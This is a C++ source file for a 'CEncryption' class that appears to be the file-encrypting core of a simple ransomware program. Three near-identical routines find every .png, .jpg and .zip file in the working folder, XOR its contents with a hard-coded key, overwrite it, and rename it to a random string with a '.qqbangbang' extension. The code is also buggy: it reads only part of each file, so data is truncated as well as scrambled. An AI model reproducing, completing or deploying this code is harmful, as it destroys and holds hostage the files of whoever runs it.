/***********************************************************************************\
* Created: 6/30/2017 by Ali Sepehri-Amin
* Version: 1.00
* Description: The class for encryption file types
\***********************************************************************************/

#include <Windows.h>
#include <fstream>
#include <algorithm>
#include <iostream>
#include <string>
#include <vector>
#include <mciapi.h>
#include <iterator>
#include <random>

#include "Encryption.h"

char key[10] = { 'K', 'E', 'Y','I','E','Q','W','X','R','H' };


static const char alphanum[] =
"0123456789"
"!@#$%^&*"
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz";

int stringLength = sizeof(alphanum) - 1;

char genRandom()
{
	return alphanum[rand() % stringLength];
}

/* A simple XOR-based encryption */
string CEncryption::XOR(string data, char key[])
{
	string xorstring = data;
	for (int i = 0; i < xorstring.size(); i++)
	{
		xorstring[i] = data[i] ^ key[i % (sizeof(key) / sizeof(char))];
	}
	return xorstring;
}

int CEncryption::generateRandomNumber(int i)
{
	int m_GRE;
	for (int x = 3; x <= 30; x++)
	{
		m_GRE = 130 * 18 + 190 + i;
	}

	return m_GRE;
}

/* Encrypt all .png files in the folder */
void CEncryption::EncryptPng()
{
	int i = 0, y = 0;
	string fileData;
	string editedFileData;
	LPCSTR file = "*.png";
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	const char* nenameItem;
	const char* newName;
	vector<string> viss;

	hFind = FindFirstFile(file, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do {
			viss.push_back(FindFileData.cFileName);
		} while (FindNextFile(hFind, &FindFileData));
		FindClose(hFind);
	}

	std::cout << "count:" << viss.size() << "\n";
	for (int i = 0; i < viss.size(); i++)
	{
		// Implement encryption here
		ifstream inputFile;
		inputFile.open(viss[i]);
		inputFile >> fileData;
		editedFileData = XOR(fileData, key);
		inputFile.close();
		ofstream exportFile;
		exportFile.open(viss[i]);
		exportFile << editedFileData;
		exportFile.close();
		srand(generateRandomNumber(i));
		std::string Str;
		for (unsigned int i = 0; i <= 20; ++i)
		{
			Str += genRandom();
		}

		nenameItem = viss[i].c_str();
		Str += ".qqbangbang";
		newName = +Str.c_str();
		//cout << nenameItem << "  --NEW NAME--  " << newName << endl;
		rename(nenameItem, newName);
	}
}

/* Encrypt all .jpg files in the folder */
void CEncryption::EncryptJpg()
{
	int i = 0, y = 0;
	string fileData;
	string editedFileData;
	LPCSTR file = "*.jpg";
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	const char* nenameItem;
	const char* newName;
	vector<string> viss;

	hFind = FindFirstFile(file, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do {
			viss.push_back(FindFileData.cFileName);
		} while (FindNextFile(hFind, &FindFileData));
		FindClose(hFind);
	}

	std::cout << "count:" << viss.size() << "\n";
	for (int i = 0; i < viss.size(); i++)
	{
		// Implement encryption here
		ifstream inputFile;
		inputFile.open(viss[i]);
		inputFile >> fileData;
		editedFileData = XOR(fileData, key);
		inputFile.close();
		ofstream exportFile;
		exportFile.open(viss[i]);
		exportFile << editedFileData;
		exportFile.close();
		srand(generateRandomNumber(i));
		std::string Str;
		for (unsigned int i = 0; i <= 20; ++i)
		{
			Str += genRandom();
		}

		nenameItem = viss[i].c_str();
		Str += ".qqbangbang";
		newName = +Str.c_str();
		rename(nenameItem, newName);
	}
}

/* Encrypt all .zip files in the folder */
void CEncryption::EncryptZip()
{
	int i = 0, y = 0;
	string fileData;
	string editedFileData;
	LPCSTR file = "*.zip";
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	const char* nenameItem;
	const char* newName;
	vector<string> viss;

	hFind = FindFirstFile(file, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do {
			viss.push_back(FindFileData.cFileName);
		} while (FindNextFile(hFind, &FindFileData));
		FindClose(hFind);
	}

	std::cout << "count:" << viss.size() << "\n";
	for (int i = 0; i < viss.size(); i++)
	{
		// Implement encryption here
		ifstream inputFile;
		inputFile.open(viss[i]);
		inputFile >> fileData;
		editedFileData = XOR(fileData, key);
		inputFile.close();
		ofstream exportFile;
		exportFile.open(viss[i]);
		exportFile << editedFileData;
		exportFile.close();
		srand(generateRandomNumber(i));
		std::string Str;
		for (unsigned int i = 0; i <= 20; ++i)
		{
			Str += genRandom();
		}

		nenameItem = viss[i].c_str();
		Str += ".qqbangbang";
		newName = +Str.c_str();
		//cout << nenameItem << "  --NEW NAME--  " << newName << endl;
		rename(nenameItem, newName);
	}
}